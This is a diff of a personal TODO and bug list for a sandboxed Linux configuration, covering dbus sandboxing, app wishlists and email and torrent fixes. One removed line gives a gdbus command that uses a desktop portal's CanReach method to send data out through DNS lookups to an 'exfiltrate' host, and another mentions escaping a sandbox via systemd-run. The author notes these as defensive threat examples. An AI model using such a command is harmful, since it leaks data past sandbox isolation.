@@ -1,5 +1,6 @@
 ## BUGS
 - alacritty Ctrl+N frequently fails to `cd` to the previous directory
+- bunpen dbus sandboxing can't be *nested* (likely a problem in xdg-dbus-proxy)
 - dissent has a memory leak (3G+ after 24hr)
   - set a max memory use in the systemd service, to force it to restart as it leaks?
 - `rmDbusServices` may break sandboxing
@@ -79,12 +80,7 @@
 - port all sane.programs to be sandboxed
   - sandbox `nix`
   - enforce that all `environment.packages` has a sandbox profile (or explicitly opts out)
-  - lock down dbus calls within the sandbox
-    - <https://github.com/flatpak/xdg-dbus-proxy>
-    - stuff on dbus presents too much surface area
-      - ~~for example anyone can `systemd-run --user ...` to potentially escape a sandbox~~
-      - for example, xdg-desktop-portal allows anyone to make arbitrary DNS requests
-        - e.g. `gdbus call --session --timeout 10 --dest org.freedesktop.portal.Desktop --object-path /org/freedesktop/portal/desktop --method org.freedesktop.portal.NetworkMonitor.CanReach 'data1.exfiltrate.uninsane.org' 80`
+  - enforce granular dbus sandboxing (bunpen-dbus-*)
 - make gnome-keyring-daemon less monolithic
   - no reason every application with _a_ secret needs to see _all_ secrets
   - check out oo7-daemon?
@@ -110,7 +106,6 @@
   - offline Wikipedia (or, add to `wike`)
   - some type of games manager/launcher
     - Gnome Highscore (retro games)?: <https://gitlab.gnome.org/World/highscore>
-  - better maps for mobile (Osmin (QtQuick)? Pure Maps (Qt/Kirigami)?)
   - note-taking app: <https://linuxphoneapps.org/categories/note-taking/>
     - Folio is nice, uses standard markdown, though it only supports flat repos
   - OSK overlay specifically for mobile gaming
@@ -142,6 +137,7 @@
 - SwayNC/nwg-panel: add option to change audio output
 - Newsflash: sync OPML on start, same way i do with gpodder
 - better podcasting client?
+- hardware upgrade (OnePlus)?
 
 #### non-moby
 - RSS: integrate a paywall bypass
@@ -157,6 +153,7 @@
   - maybe just color these "keywords" in all search results?
 - transmission: apply `sane-tag-media` path fix in `torrent-done` script
   - many .mkv files do appear to be tagged: i'd just need to add support in my own tooling
+  - more aggressively cleanup non-media files after DL (ripper logos, info txts)
 - uninsane.org: make URLs relative to allow local use (and as offline homepage)
 - email: fix so that local mail doesn't go to junk
   - git sendmail flow adds the DKIM signatures, but gets delivered locally w/o having the sig checked, so goes into Junk
